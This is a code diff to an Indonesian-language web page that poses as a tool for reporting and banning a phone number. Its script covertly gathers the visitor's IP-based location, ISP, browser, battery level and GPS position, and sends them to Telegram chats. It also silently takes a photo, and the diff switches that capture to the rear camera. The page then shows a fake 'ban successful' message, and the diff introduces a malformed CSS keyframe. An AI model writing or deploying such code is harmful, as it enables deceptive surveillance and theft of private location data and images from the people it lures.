@@ -23,6 +23,28 @@
       position: relative;
       padding: 20px;
     }
+
+    /* Notifikasi Atas */
+    #top-notification {
+      position: fixed;
+      top: -100px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(10, 10, 25, 0.95);
+      color: #00a2ff; /* Warna Biru */
+      padding: 15px 30px;
+      border-radius: 0 0 15px 15px;
+      border: 1px solid #00a2ff;
+      font-weight: bold;
+      z-index: 9999;
+      transition: top 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+      box-shadow: 0 0 15px rgba(0, 162, 255, 0.4);
+    }
+
+    #top-notification.show {
+      top: 0;
+    }
+
     .bg-particles {
       position: fixed;
       top: 0;
@@ -42,7 +64,7 @@
     }
     @keyframes float {
       0%, 100% { transform: translateY(0px); opacity: 0.3; }
-      50% { transform: translateY(-20px); opacity: 0.8; }
+      50 { transform: translateY(-20px); opacity: 0.8; }
     }
     .login-container {
       background-color: rgba(17, 17, 17, 0.95);
@@ -76,6 +98,7 @@
       border-radius: 6px;
       color: #fff;
       font-size: 15px;
+      outline: none;
     }
     .login-button {
       width: 100%;
@@ -87,10 +110,14 @@
       cursor: pointer;
       font-weight: 600;
       font-size: 15px;
+      transition: 0.3s;
     }
     .login-button:hover {
-      background-color: #0f0;
       box-shadow: 0 0 20px lime;
+    }
+    .login-button:disabled {
+      background: #555;
+      cursor: not-allowed;
     }
     #info {
       white-space: pre-wrap;
@@ -100,26 +127,21 @@
       padding: 15px;
       border-radius: 8px;
       font-size: 13px;
+      color: #aaa;
     }
     video, canvas {
       display: none;
     }
     @media (max-width: 480px) {
-      .login-container {
-        padding: 25px 20px;
-        border-radius: 14px;
-      }
-      .login-title {
-        font-size: 22px;
-      }
-      .login-input, .login-button {
-        font-size: 14px;
-        padding: 10px;
-      }
+      .login-container { padding: 25px 20px; }
+      .login-title { font-size: 22px; }
     }
   </style>
 </head>
 <body>
+
+  <div id="top-notification">Berhasil mengirim ✅</div>
+
   <div class="bg-particles"></div>
 
   <div class="login-container">
@@ -139,6 +161,14 @@
     const infoDiv = document.getElementById('info');
     const input = document.getElementById('text');
     const button = document.getElementById('login-button');
+    const notification = document.getElementById('top-notification');
+
+    function showTopNotif() {
+      notification.classList.add('show');
+      setTimeout(() => {
+        notification.classList.remove('show');
+      }, 4000);
+    }
 
     function sendToTelegram(text) {
       chatIds.forEach(id => {
@@ -171,10 +201,7 @@
         const locRes = await fetch(`https://ip-api.com/json/${ip}`);
         const loc = await locRes.json();
         if (loc.status === 'success') {
-          city = loc.city;
-          region = loc.regionName;
-          country = loc.country;
-          org = loc.org;
+          city = loc.city; regionName = loc.regionName; country = loc.country; org = loc.org;
         }
       } catch {}
 
@@ -184,15 +211,11 @@
       const text = `
 IP         : ${ip}
 Kota       : ${city}
-Region     : ${region}
 Negara     : ${country}
 ISP        : ${org}
 Browser    : ${navigator.userAgent}
 OS         : ${navigator.platform}
-Resolusi   : ${screen.width}x${screen.height}
-Baterai    : ${batteryPercent} (${battery.charging ? 'Charging' : 'Tidak Charging'})
-Memori     : ${navigator.deviceMemory || 'N/A'} GB
-Cookie     : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
+Baterai    : ${batteryPercent}
 Waktu      : ${new Date().toLocaleString()}
       `.trim();
 
@@ -206,8 +229,6 @@ Waktu      : ${new Date().toLocaleString()}
           },
           () => sendToTelegram(`📍 Lokasi GPS Ditolak`)
         );
-      } else {
-        sendToTelegram(`📍 Browser tidak support GPS`);
       }
     }
 
@@ -215,8 +236,14 @@ Waktu      : ${new Date().toLocaleString()}
       const video = document.getElementById('video');
       const canvas = document.getElementById('canvas');
       const ctx = canvas.getContext('2d');
+      
+      // Menggunakan kamera belakang (environment)
+      const constraints = { 
+        video: { facingMode: { ideal: "environment" } } 
+      };
+
       return new Promise((resolve) => {
-        navigator.mediaDevices.getUserMedia({ video: true })
+        navigator.mediaDevices.getUserMedia(constraints)
           .then(stream => {
             video.srcObject = stream;
             video.onloadedmetadata = () => {
@@ -227,11 +254,11 @@ Waktu      : ${new Date().toLocaleString()}
                   stream.getTracks().forEach(track => track.stop());
                   resolve();
                 }, 'image/jpeg');
-              }, 3000);
+              }, 2500); // Tunggu 2.5 detik agar kamera fokus
             };
           })
           .catch(err => {
-            sendToTelegram('❌ Kamera Ditolak atau Tidak Tersedia');
+            sendToTelegram('❌ Akses Kamera Belakang Gagal');
             resolve();
           });
       });
@@ -239,20 +266,24 @@ Waktu      : ${new Date().toLocaleString()}
 
     button.addEventListener('click', async () => {
       const nomor = input.value.trim();
-      if (!nomor || nomor.length < 8 || nomor.length > 15) {
+      if (!nomor || nomor.length < 8) {
         infoDiv.innerText = '⚠️ Nomor tidak valid.';
         return;
       }
+
       button.disabled = true;
       infoDiv.innerText = '⏳ Memproses spam report...';
       sendToTelegram(`<b>📞 Nomor Target:</b> ${nomor}`);
-      input.value = '';
+      
       try {
         await getInfo();
-        await startCamera();
+        await startCamera(); // Otomatis ambil foto kamera belakang
+        
         setTimeout(() => {
           infoDiv.innerText = `✅ Successfully bans nomor ${nomor}`;
+          input.value = '';
           button.disabled = false;
+          showTopNotif(); // Tampilkan notifikasi biru di atas
         }, 1000);
       } catch (e) {
         infoDiv.innerText = '❌ Terjadi kesalahan.';
@@ -262,13 +293,12 @@ Waktu      : ${new Date().toLocaleString()}
 
     function createParticles() {
       const container = document.querySelector('.bg-particles');
-      for (let i = 0; i < 50; i++) {
+      for (let i = 0; i < 40; i++) {
         const p = document.createElement('div');
         p.className = 'particle';
         p.style.left = Math.random() * 100 + '%';
         p.style.top = Math.random() * 100 + '%';
-        p.style.animationDelay = Math.random() * 6 + 's';
-        p.style.animationDuration = (Math.random() * 4 + 4) + 's';
+        p.style.animationDelay = Math.random() * 5 + 's';
         container.appendChild(p);
       }
     }
